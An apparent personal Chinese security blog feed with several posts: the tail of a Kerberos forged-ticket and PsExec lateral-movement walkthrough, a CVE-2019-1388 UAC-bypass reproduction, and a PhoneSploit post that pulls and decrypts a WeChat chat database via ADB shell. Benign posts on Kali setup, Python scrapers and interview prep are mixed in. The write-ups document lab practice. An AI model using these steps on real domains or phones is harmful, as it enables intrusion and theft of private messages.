<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list   //查看当前凭证</span><br><span class="line">kerberos::purge  //清除凭证</span><br><span class="line">kerberos::list   //再次查看，确保无凭证</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/09/Bjp6xfNRreKqLyD.png" alt="Image 20.png"></p>
<p>使用如下命令导入刚刚生成的伪造凭证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptc 凭证地址</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/09/qs5OaY7zHCybkZN.png" alt="Image 21.png"></p>
<p>再次访问域控的共享文件，即可发现已经成功列出目录了</p>
<p><img src="https://i.loli.net/2020/01/09/rK3oDBlA2m8zdIx.png" alt="Image 22.png"></p>
<p>使用Psexec64.exe横向移动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psesec.exe -accepteula \\IPaddress -s cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/09/tO6l25Wq3ak4VIT.png" alt="Image 24.png"></p>
<p>可以观察到命令提示符已经变了，且用户权限为域控的system权限（由于Psexec64.exe的-s原因）。看IP地址也可知晓已经成功登陆域控机器了。</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>记《原则》</title>
    <url>/2019/12/13/%E8%AE%B0%E3%80%8A%E5%8E%9F%E5%88%99%E3%80%8B/</url>
    <content><![CDATA[<p>《原则》– Ray Dalio<br>记录一下在读这本书的过程中遇到的写的很好的句子。</p><a id="more"></a>
<ul>
<li>如果你能独立思考，同时保持开放的头脑，清醒地寻找并发现最适合你的事情，如果你能鼓起勇气这么做，你将会让自己的生命发挥最大的价值。如果你做不到这一点，你应当思考为什么，因为这很可能是你面临的实现自己人生愿望的最大障碍。</li>
<li>我认为成功的关键在于，既知道如何努力追求很多东西，也知道如何正确地失败。“正确的失败”是指，能够在经理痛苦的失败的过程中吸取重要的教训，从而避免“错误的失败”，即因为失败而被踢出局。</li>
<li>时间就像一条河流，载着我们顺流而下，遇到现实，需要决策，但我们无法停留，也无法回避，只能以最好的方式应对。</li>
<li>在一生中，我们会做出无数的决定，这些决定实质上都是赌博，一些是大赌，一些是小赌。思考我们如何做出决定是有好处的，因为这将最终决定我们的生活质量。</li>
<li>回头来看，我的一败涂地是在我身上发生过的最好的事情之一，因为它让我变得谦逊，而我正需要谦逊来平衡我的进攻性。我学到了一种很好的恐惧犯错的意识，这把我的思维定式从认为“我是对的”变成了问我自己“我怎么知道我是对的”。我清楚地看到，回答这个问题的最好方式就是找到其他的独立思考者，他们与我肩负共同的使命，但对问题的看法与我不同。通过以一种经过深思熟虑的辩论方式与他们交流，我就能理解他们的推理，并让他们对我的推理进行压力测试。我们都可以通过这种方式降低自己犯错的可能性。</li>
<li>一些人倾向于过度冒险，而其他人的风险规避性过强；一些人过度关注细节，而其他人的思维过于宏观。大多数人都是在某个方面过度，而在另一方面不足。通常，当我们遵循自己的自然秉性做事时，我们可能考虑不到自身的弱点，这将导致我们走向失败。</li>
<li>我建议你保持足够的好奇心，始终愿意去理解那些看问题与你不一样的人是怎么形成他们看问题的方式的。你将会发现这很有趣，并且益处无穷，而你获得的更丰富的视角将帮助你决定你应当怎么做。</li>
<li>想要拥有很多优势，而又不暴露于不可接受的劣势下，最稳妥的方式是做出一系列良好的、互不相关的押注，彼此平衡，互相补充。</li>
<li>英雄总是会至少经历一次极大的失败，这将考验他们有没有韧性东山再起，以更大的决心和更多的智慧继续战斗。</li>
</ul>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-1388复现记录</title>
    <url>/2019/12/06/CVE-2019-1388%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>可以看这个人的博客，<a href="http://blog.leanote.com/post/snowming/38069f423c76" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/38069f423c76</a></p><a id="more"></a>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows: 7, 8.1, 10, 10 1607, 10 1709, 10 1803, 10 1809, 10 1903, RT 8.1</span><br><span class="line"></span><br><span class="line">Windows Server: 1803, 1903, 2008, 2008 R2, 2012, 2012 R2, 2016, 2019</span><br></pre></td></tr></table></figure>
<h3 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h3><p>我这里使用的是win7，输入以下命令查看是否打上安全补丁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo&gt;snowming.txt&amp;(for %i in (KB4525235 KB4525233) do @type snowming.txt|@find /i  &quot;%i&quot;|| @echo  no this padding: %i)&amp;del /f /q /a snowming.txt</span><br></pre></td></tr></table></figure>
<p>原本的机器是打上了补丁的，但是为了方便演示，我卸载掉了。</p>
<p><img src="https://i.loli.net/2019/12/06/z4BMA239VtFKZpn.png" alt="Image 1.png"></p>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>本处使用的是win7 sp1版本，其他版本自行测试，用户为新建的普通用户。<br><img src="https://i.loli.net/2019/12/06/5tXWyMRazUfnBkE.png" alt="Image 3.png"></p>
<p>首先在<a href="https://github.com/sv3nbeast/CVE-2019-1388" target="_blank" rel="noopener">github</a>上下载回来利用程序，然后放在外网可访问的地方，复现均为内网环境，此处使用kali替代。<br><img src="https://i.loli.net/2019/12/06/fErIRmkUZy8NHzs.png" alt="Image 2.png"></p>
<p>在win7中使用IE打开程序访问地址，将其下载到本地<br><img src="https://i.loli.net/2019/12/06/B4TUEpGaxSnZQNO.png" alt="Image 5.png"><br>打开程序属性，点击“解除锁定”，应用、确定<br><img src="https://i.loli.net/2019/12/06/dcDo4z85jHmlk6b.png" alt="Image 7.png"></p>
<p>右键“以管理员身份运行”打开UAC弹框，点击“显示详细信息”，打开“显示有关此发布者的证书的信息”链接<br><img src="https://i.loli.net/2019/12/06/esPDgB6u2nQzbKi.png" alt="Image 8.png"></p>
<p>点击“颁发者”处的超链接后，关闭UAC窗口，可以看到IE浏览器打开了一个地址：<a href="https://www.verisign.com/en_US/verisign-repository/CPS/index.xhtml" target="_blank" rel="noopener">https://www.verisign.com/en_US/verisign-repository/CPS/index.xhtml</a><br><img src="https://i.loli.net/2019/12/06/xIvTUsKWyFdP7uq.png" alt="Image 9.png"><br><img src="https://i.loli.net/2019/12/06/P7DxqCUS3fFdOoN.png" alt="Image 10.png"></p>
<p>此时点击“设置-&gt;文件-&gt;另存为”，打开文件窗口。<br><img src="https://i.loli.net/2019/12/06/IDgdNLJsHjQX7CW.png" alt="Image 11.png"></p>
<p>如果显示“位置不可用”信息，关闭即可。在文件名处输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\*.*</span><br></pre></td></tr></table></figure>
<p>找到cmd.exe程序，右键打开即为system权限</p>
<p><img src="https://i.loli.net/2019/12/06/EMqCKdftyJRHL36.png" alt="Image 12.png"><br><img src="https://i.loli.net/2019/12/06/zPkLYOAV7S9Hvxf.png" alt="Image 13.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://www.anquanke.com/vul/id/1830634" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1830634</a></li>
<li><a href="http://blog.leanote.com/post/snowming/38069f423c76" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/38069f423c76</a></li>
<li><a href="https://www.youtube.com/embed/3BQKpPNlTSo?wmode=opaque&amp;enablejsapi=1" target="_blank" rel="noopener">https://www.youtube.com/embed/3BQKpPNlTSo?wmode=opaque&amp;enablejsapi=1</a></li>
</ul>
]]></content>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-linux 2019.4安装</title>
    <url>/2019/11/29/kali-linux2019.4%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天体验了一下kali-linux2019.4版，真香真香<br><img src="https://i.loli.net/2019/11/29/ENAfrFbnylCYaim.png" alt="Image 33.png"><br>我这里把iso镜像下载下来放网盘了。各位自取，不放心可以对比一下hash或自己在官网上下载<br>链接：<a href="https://pan.baidu.com/s/1c38o-GzfI-ECrBf4jR6ACw" target="_blank" rel="noopener">https://pan.baidu.com/s/1c38o-GzfI-ECrBf4jR6ACw</a><br>提取码：8hva</p><a id="more"></a>
<h3 id="安装VMtools"><a href="#安装VMtools" class="headerlink" title="安装VMtools"></a>安装VMtools</h3><p>安装和以前一样都没什么区别，<br>但是如果选了中文字体的话，后面可能会有乱码，如下图所示，可以看到登录界面上已经出现了<br><img src="https://i.loli.net/2019/11/29/BFIifpbOMg1CL4D.png" alt="Image 36.png"><br>假装没看到，先登录进去，，，可以看到乱码真的太难看了。<br><img src="https://i.loli.net/2019/11/29/s5HIgyPtZanNMxf.png" alt="Image 37.png"><br>都别管，先安装VMtools：<br>1、打开VM虚拟机的“虚拟机”菜单，选择“安装VMware Tools”<br>2、可以看到桌面上多了个VMtools的光盘图标，双击打开将里面的压缩包拖到桌面上<br><img src="https://i.loli.net/2019/11/29/RDxbE5O4QqaIyLr.png" alt="Image 38.png"><br>3、在桌面打开终端，解压压缩包，进入解压目录执行安装脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf VMwareTools-10.3.10-13959562.tar.gz</span><br><span class="line">cd vmware-tools-distrib</span><br><span class="line">./vmwareinstall.pl</span><br></pre></td></tr></table></figure>
<p>一路默认回车即可<br>看到最后的“Enjoy”就说明安装成功了<br><img src="https://i.loli.net/2019/11/29/hwOqyCGEgHvcL8n.png" alt="Image 40.png"></p>
<p>为什VMtools生效，最好重启一下<br>这一步是为了方便我复制东西，愿意手敲命令的也可以不安装VMtools，不过现在不装以后为了方便还是要装的</p>
<h3 id="解决中文字体乱码问题"><a href="#解决中文字体乱码问题" class="headerlink" title="解决中文字体乱码问题"></a>解决中文字体乱码问题</h3><p>1、更换清华源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p>打开sources.list文件，在最后添加清华源，保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/29/nkFv3DqLcxITQHZ.png" alt="Image 41.png"></p>
<p>保存后更新一下源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/29/5VHp3ky6WbmRdcU.png" alt="Image 42.png"></p>
<p>2、安装文泉驿微米黑和文泉驿正黑字体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-intl-chinese</span><br></pre></td></tr></table></figure>

<p>3、更改默认编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
<p>输入完命令会出现一个界面<br><img src="https://i.loli.net/2019/11/29/ik4DNuTO92aEdhn.png" alt="Image 43.png"><br>虽然难看了点，但是先别管<br>进入图形化界面之后，上下键移动，空格是选择，Tab是切换<br>选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8<br><img src="https://i.loli.net/2019/11/29/E8mxLoKGVnFXwS2.png" alt="Image 44.png"><br><img src="https://i.loli.net/2019/11/29/4EckSN21ZRTKUn5.png" alt="Image 45.png"><br>选择后，将zh_CN.UTF-8 UTF-8选为默认。<br>按tab选择第一个框按空格<br><img src="https://i.loli.net/2019/11/29/wSyDKomxRMeALfp.png" alt="Image 46.png"><br>然后选择好“zh_CN.UTF-8”按tab选第一个框，按空格确定<br><img src="https://i.loli.net/2019/11/29/OxYgUsjzMLZHd46.png" alt="Image 48.png"><br>完了再重启<br>可以看到已经正常了<br><img src="https://i.loli.net/2019/11/29/PZGmEusOY7MqB3h.png" alt="Image 49.png"></p>
<h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>我在后续使用时，发现系统没有python2版本的pip和python3版本的pip<br>用下面的命令安装即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install python-pip</span><br><span class="line">apt install python3-pip</span><br></pre></td></tr></table></figure>
<p>安装完看一下<br><img src="https://i.loli.net/2019/11/29/S9iRLZzVaCPdh2M.png" alt="Image 50.png"><br>莫得问题。自己玩吧。</p>
<hr>
<p>这个版本有个有意思的东西是可以切换到windows风格，（是怕在公众场合用kali怕被别人打吧）终端中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali-undercover</span><br></pre></td></tr></table></figure>
<p>就可以切换，我就不贴图了，自己试试</p>
]]></content>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>爬取91美剧网top60榜单</title>
    <url>/2019/11/28/%E7%88%AC%E5%8F%9691%E7%BE%8E%E5%89%A7%E7%BD%91top60%E6%A6%9C%E5%8D%95/</url>
    <content><![CDATA[<p>我又来水篇文章啦。。。<br>看完大眼仔，闲的无聊就顺手爬了一下这个网站top60的排行榜单。</p><a id="more"></a>
<hr>
<p>先看一下top60的页面<br><img src="https://i.loli.net/2019/11/28/1GY9UEunLRDpSaF.png" alt="Xnip2019-11-28_20-22-31.png"></p>
<p>我这就只为了取top排名和美剧名称，所以这里只是简单的用requests和正则爬下来了。<br>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 91美剧网，美剧排行榜前60名</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;https://91mjw.com/alltop_hit&quot;</span><br><span class="line"></span><br><span class="line">def get_html(url):</span><br><span class="line">    req = requests.get(url).content.decode(&apos;utf-8&apos;)</span><br><span class="line">    return req</span><br><span class="line"></span><br><span class="line">tops = re.findall(r&apos;&lt;span&gt;Top (\d*)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;zhuangtai&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&apos;,str(get_html(url)))</span><br><span class="line">movie_names = re.findall(r&apos;&lt;h2&gt;(.*?)&lt;/h2&gt;&lt;/a&gt;&lt;/article&gt;&apos;,str(get_html(url)))</span><br><span class="line"># 电影名称这里注意，使用&quot;.*&quot;贪婪匹配时，把那一段都匹配了，但是&quot;.*?&quot;非贪婪匹配时就正常了</span><br><span class="line"></span><br><span class="line"># str_top = &quot;&quot;.join(top)</span><br><span class="line"># str_movie_name = &quot;&quot;.join(movie_name)</span><br><span class="line"># 这里是讲正则匹配出的内容字符串化,list-&gt;str,但是这里不需要了。。。。</span><br><span class="line"></span><br><span class="line">for top,movie_name in zip(tops,movie_names):</span><br><span class="line">     print(&quot;top &#123;0&#125; -&gt; &#123;1&#125;&quot;.format(top,movie_name))</span><br><span class="line">#这里开始没弄明白的循环输出，其实只要压包（zip）一下就好了。将两个列表合并起来。</span><br></pre></td></tr></table></figure>

<p>效果如下：<br><img src="https://i.loli.net/2019/11/28/BKFhrUOnmpwtRYD.png" alt="Xnip2019-11-28_20-31-21.png"></p>
<p>这里只是简单的根据正则匹配了一下，本文主要是说说代码中那三部分注释所学到的东西</p>
<p>1.贪婪匹配与非贪婪匹配:</p>
<ul>
<li>贪婪匹配：在正则匹配成功的情况下，尽量多的匹配数据。</li>
<li>非贪婪匹配：在正则匹配成功的情况下，尽量少的匹配数据。</li>
</ul>
<p>我们举个例子理解一下：<br><img src="https://i.loli.net/2019/11/28/iTb6lxNuEoRk4K2.png" alt="Xnip2019-11-28_21-34-34.png"></p>
<p>先看result1，我们想要匹配data内容中的数字部分，所以我们用“\d+”来匹配1个或多个数字，但是我们又不想要数字两边的“llo ”和“ wor”这种杂乱的数据，所以我们用“.* ”去匹配任意字符。<br>但是看result1的输出，正则只匹配出了一个数字“5”。<br>这是因为“.* ”是贪婪匹配，贪婪匹配的特性就是尽可能多的匹配数据，所以根据正则的流程，result1中的第一个“.* ”匹配了“llo 1234”这些数据，只留了一个“5”给“\d+”去满足匹配。而后面的“ wor”本身就不属于数字，自然交给第二个“.* ”匹配掉了。</p>
<p>再来看看result2，同样正则是取数字部分，但是由于第一个“.* ?”是非贪婪，非贪婪匹配的特性就是尽可能少的匹配数据，所以result2中为了满足“\d+”取数字部分的正则，第一个“.* ?”就只取了“llo ”，并将全部的数字“12345”留给了“\d+”。</p>
<p>所以在写正则时尽可能将杂乱数据用非贪婪匹配“.* ?”防止数据丢失。</p>
<p>2.正则匹配结果list转化为str:<br><img src="https://i.loli.net/2019/11/28/UKXOrx8WdiMShsV.png" alt="Xnip2019-11-28_22-00-15.png"><br>当一个正则匹配出结果的时候，可以看到输出为一个列表的形式，但是有时候，我们需要输出的是一个字符串，这时候我们可以使用join()方法将list转为字符串。</p>
<ul>
<li>str.join(sequence)：该方法将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串。sequence表示要连接的序列，前面的str表示分隔符（）<br>举个例子：<br><img src="https://i.loli.net/2019/11/28/IaWyvkXbhiSERrf.png" alt="Xnip2019-11-28_22-12-15.png"></li>
</ul>
<p>3.合并两个列表:<br>当我用正则匹配出两个列表的时候，我想将其组合起来输出，开始我使用循环的方式输出，但是后来觉得不太好看，而且复杂。翻了翻发现还有个zip函数。。。。原谅我之前没注意到。</p>
<ul>
<li>zip()：该函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的对象，这样做的好处是节约了不少的内存。后续可以使用 list() 转换来输出列表。如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。<br>一长串的看的也不是很明白，举个例子：<br><img src="https://i.loli.net/2019/11/28/OznUlA7yVdo84xY.png" alt="Xnip2019-11-28_22-33-44.png"></li>
</ul>
<p>简单来说就是讲两个列表中的值一一对应起来组合成一个新的元组，且元素数量按最低的列表来（类似短板效应）。<br>溜了溜了，睡觉了。</p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>爬取安全客SRC列表</title>
    <url>/2019/11/22/%E7%88%AC%E5%8F%96%E5%AE%89%E5%85%A8%E5%AE%A2SRC%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<p>写了个简单爬虫把安全客上的SRC列表爬了下来<br><img src="https://i.loli.net/2019/11/22/FWVsbkRnLSwAgim.png" alt="Image 137.png"></p><a id="more"></a>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;https://www.anquanke.com/src&quot;</span><br><span class="line">def src(url):</span><br><span class="line">    res = requests.get(url).content.decode(&apos;utf-8&apos;)</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">code = re.findall(r&apos;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;/src/(\d+)&quot;&gt;&apos;,str(src(url)))</span><br><span class="line"></span><br><span class="line">for codes in code:</span><br><span class="line">    res2 = requests.get(&quot;https://www.anquanke.com/src/&quot; + codes).content.decode(&apos;utf-8&apos;)</span><br><span class="line">    srcname = re.findall(r&apos;&lt;title&gt;(.*) - 安全客&apos;,res2)</span><br><span class="line">    urladdress = re.findall(r&apos;&lt;h2&gt;网址.*href=&quot;(.*?)&quot;&gt;.*&lt;h2&gt;漏洞提交入口&lt;/h2&gt;&apos;,res2,flags=re.DOTALL)</span><br><span class="line">    str_srcname = &quot;&quot;.join(srcname)</span><br><span class="line">    str_urladdress = &quot;&quot;.join(urladdress)</span><br><span class="line">    print(r&quot;名称：&#123;0&#125; , 地址：&#123;1&#125; &quot;.format(str_srcname,str_urladdress))</span><br></pre></td></tr></table></figure>

<p>效果：<br><img src="https://i.loli.net/2019/11/22/InSkyfam15uKt6z.png" alt="Image 138.png"></p>
<p>学到的东西：<br>正则“.”匹配时是默认不匹配换行符的，后面加个“flags=re.DOTALL”就好了</p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>dump下来的文章</title>
    <url>/2019/11/21/dump%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>看到别人发的，我就又转存到百度云了。<br>里面的文章是来自：</p><a id="more"></a>
<ul>
<li>安全客(2019.1.2-至今) </li>
<li>SoBUG安全平台 </li>
<li>重生信息安全 </li>
<li>安全盒子</li>
</ul>
<p>某大佬dump下来的，怕以后看不到了。。。。。</p>
<p>链接：<a href="https://pan.baidu.com/s/1da1l781b8hBvPKIAAjd8kQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1da1l781b8hBvPKIAAjd8kQ</a><br>提取码：ieol </p>
]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>phonesploit后续研究（微信取证）</title>
    <url>/2019/11/21/phonesploit%E5%90%8E%E7%BB%AD%E7%A0%94%E7%A9%B6%EF%BC%88%E5%BE%AE%E4%BF%A1%E5%8F%96%E8%AF%81%EF%BC%89/</url>
    <content><![CDATA[<p>此处是使用夜神模拟器做后续研究</p><a id="more"></a>
<p><img src="https://i.loli.net/2020/04/11/yslaMuz7tJIUVGC.jpg" alt="ip_image002.jpeg"></p>
<p>开启PhoneSploit，输入夜神模拟器IP地址即可，菜单1可以看到连接状态</p>
<p><img src="https://i.loli.net/2020/04/11/RKlqofMdBnm9Usb.jpg" alt="ip_image004.jpeg"></p>
<p>输入菜单7截取当前屏幕，此处填文件名为99.png保存下来</p>
<p><img src="https://i.loli.net/2020/04/11/yDbFOIp3Zu2tdRP.jpg" alt="ip_image005.jpeg"></p>
<p><img src="https://i.loli.net/2020/04/11/BbWMDzAefrPi1xp.jpg" alt="ip_image008.jpeg"></p>
<h3 id="获取微信聊天记录实验"><a href="#获取微信聊天记录实验" class="headerlink" title="获取微信聊天记录实验"></a>获取微信聊天记录实验</h3><p>首先我登录了我的微信小号A,，给我另外一个号发了几条消息</p>
<p><img src="https://i.loli.net/2020/04/11/o5dJRLtmfVWF7p8.png" alt="Image 1.png"></p>
<p>获取微信聊天记录，我们需要3样东西：微信UIN、手机IMEI、EnMicroMsg.db数据库文件</p>
<h4 id="1-微信UIN获取"><a href="#1-微信UIN获取" class="headerlink" title="1.微信UIN获取"></a>1.微信UIN获取</h4><p>通过菜单4，我们可以获得一个交互式shell，通过访问~/com.tencent.mm/shared_prefs/system_config_prefs.xml文件，可以获取最后一个登录微信的账户的UIN值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/V87EPrw4gx2NtWL.png" alt="clipboard.png"></p>
<p>在<int name="default_uin" value="1907***411">这一行中，value的值就是UIN。</int></p>
<h4 id="2-手机IMEI获取"><a href="#2-手机IMEI获取" class="headerlink" title="2.手机IMEI获取"></a>2.手机IMEI获取</h4><p>看了很多文章，都是说手机拨号键入：*#06#可以获取，但是在我们这个实验中显然不太实在，SO!</p>
<p>IMEI号码，我们可以通过访问~/com.tencent.mm/MicroMsg/CompatibleInfo.cfg文件获得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /data/data/com.tencent.mm/MicroMsg/CompatibleInfo.cfg</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/11/zpuhPi9fMIsWqLV.png" alt="clipbodddard.png"></p>
<p>此处是夜神模拟器随机取的，我就不打码了</p>
<h4 id="3-EnMicroMsg-db文件获取"><a href="#3-EnMicroMsg-db文件获取" class="headerlink" title="3.EnMicroMsg.db文件获取"></a>3.EnMicroMsg.db文件获取</h4><p>首先要先说一下，数据库文件基本都在 ~/com.tencent.mm/MicroMsg/<strong><em>微信用户数据存储目录</em></strong>/EnMicroMsg.db，但是微信用户数据存储目录不排除会有好几个，如下图：</p>
<p><img src="https://i.loli.net/2020/04/11/TAMOf1mjlkVDZEr.png" alt="clipboadddddddrd.png"></p>
<p>哪个是我们所要抓取的呢？，这里可以用mm+获取到的UID进行组合，加密成32位MD5的值所对应相应的目录，如下</p>
<p><img src="https://i.loli.net/2020/04/11/ZJ8IAto71uRsNdD.png" alt="clsssipboard.png"></p>
<p>可以看出第一个2e0fe***就是我们需要的微信用户数据存储目录</p>
<p>所以，通过phonesploit菜单9从远程数据库文件拉到本地解密</p>
<p>输入我们的文件路径和保存路径，我们成功的将数据库保存了下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9</span><br><span class="line">/data/data/com.tencent.mm/MicroMsg/2e0fe884b0****8d8313508879f1a1d6/EnMicroMsg.db</span><br><span class="line">/home</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/04/11/XFl7QA2VswrnNSL.png" alt="clipbaaaoard.png"></p>
<h4 id="取证-获取信息"><a href="#取证-获取信息" class="headerlink" title="取证/获取信息"></a>取证/获取信息</h4><p>将数据库放入SQLcipher2.1中，显示是需要密码的。</p>
<p>而密码就是我们刚抓出来的IMEI和UID值。将这两个值以IMEI+UID的方式拼接在一起，MD5加密后，取32位小写MD5前7位即可</p>
<p><img src="https://i.loli.net/2020/04/11/RTgSGAaV951Pzr2.png" alt="claaaipboard.png"></p>
<p>输入密码1327df3，可以看到成功读取出来了</p>
<p><img src="https://i.loli.net/2020/04/11/THRxtoKMkXbVdaC.png" alt="clipboard.png"></p>
<p>从userinfo表中，可以找到微信id、用户名、手机号等信息</p>
<p><img src="https://i.loli.net/2020/04/11/BZgVWe6x2kS9vmT.png" alt="clipdddboard.png"></p>
<p>在rcontact表中能找到小号A的好友列表，这里只有我大号一个好友</p>
<p><img src="https://i.loli.net/2020/04/11/Ce6x4fqWY3lagcB.png" alt="cliaaapboard.png"></p>
<p>在message表中可以看到聊天记录。</p>
<p><img src="https://i.loli.net/2020/04/11/GHiaNBsALQpqgxX.png" alt="clipddddddboard.png"></p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/baidu_34928905/article/details/78008287" target="_blank" rel="noopener">https://blog.csdn.net/baidu_34928905/article/details/78008287</a></p>
<p><a href="https://bbs.pediy.com/thread-250714.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250714.htm</a></p>
<p>SQLcipher2.1:</p>
<p>链接：<a href="https://pan.baidu.com/s/12a66oH6F5NmtebXh50rpiw" target="_blank" rel="noopener">https://pan.baidu.com/s/12a66oH6F5NmtebXh50rpiw</a> </p>
<p>提取码：27wh</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>个人准备渗透测试和安全面试的经验之谈（1）</title>
    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#hr面">HR面</a><ul>
<li><a href="#问题">问题</a><ul>
<li><a href="#对我们公司有什么了解为什么选择本公司">对我们公司有什么了解，为什么选择本公司</a></li>
<li><a href="#为什么想要应聘这个职位">为什么想要应聘这个职位</a></li>
<li><a href="#对安全服务是怎么理解的">对安全服务是怎么理解的</a></li>
<li><a href="#如果我不知道渗透测试两分钟说一下">如果我不知道渗透测试，两分钟说一下</a></li>
<li><a href="#如果我是一个汽车厂商你如何证明你的工作是有意义的">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li>
<li><a href="#作为应届生你如何能胜任该职位">作为应届生，你如何能胜任该职位</a></li>
<li><a href="#你有什么职业规划">你有什么职业规划</a></li>
<li><a href="#如果离职的话是因为什么原因">如果离职的话是因为什么原因</a></li>
<li><a href="#你有什么优缺点">你有什么优缺点</a></li>
<li><a href="#对于薪资的要求">对于薪资的要求</a></li>
<li><a href="#给不了这么多工资可以接受吗为什么想要这个数">给不了这么多工资可以接受吗？为什么想要这个数？</a></li>
<li><a href="#进入部门后你需要多长时间进入项目">进入部门后，你需要多长时间进入项目？</a></li>
<li><a href="#上一个面试的人能力跟你差不多但是工资方面比你要的低">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li>
<li><a href="#是否可以接受加班">是否可以接受加班</a></li>
<li><a href="#沟通能力和领导同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</a></li>
<li><a href="#工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li>
